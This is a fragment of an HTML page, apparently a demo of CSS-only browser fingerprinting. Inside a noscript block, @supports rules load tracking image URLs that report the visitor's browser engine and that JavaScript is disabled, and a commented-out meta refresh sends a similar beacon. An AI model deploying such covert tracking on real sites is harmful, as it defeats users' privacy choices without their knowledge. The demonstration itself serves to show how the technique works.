        @supports(-moz-appearance: inherit) { .badboy { background: url('/dealer.png?unjs=true&u=cssTracking(FirefoxBasedBrowser)&b=NOSCRIPT-DETECTED') } }
        @supports(-apple-pay-button-style: inherit) { .badboy { background: url('/dealer.png?unjs=true&u=cssTracking(cssWebkit)&b=NOSCRIPT-DETECTED') } }
        @supports(-webkit-touch-callout: inherit) { .badboy { background: url('/dealer.png?unjs=true&u=cssTracking(cssMobileWebkit)&b=NOSCRIPT-DETECTED') } }
        @supports(-moz-osx-font-smoothing: inherit) { .badboy { background: url('/dealer.png?unjs=true&u=cssTracking(cssMacGecko)&b=NOSCRIPT-DETECTED') } }

        h1{
            font-family: "Calibri";
        }
        p{
            font-family: 'MS UI Gothic';
        }

    </style>
    
    <div class="badboy">
      
      <div class="js-disabled-message">
        <h1 >So... Are your a real privacy bro?</h1>
      </div>
    </div>
    <!--
      <meta http-equiv="refresh" content="5; url=/dealer.png?unjs=true&u=meta-redirection&b=PRIVACY_CONFIG-DETECTED"> 
    -->
  </noscript>
</html>
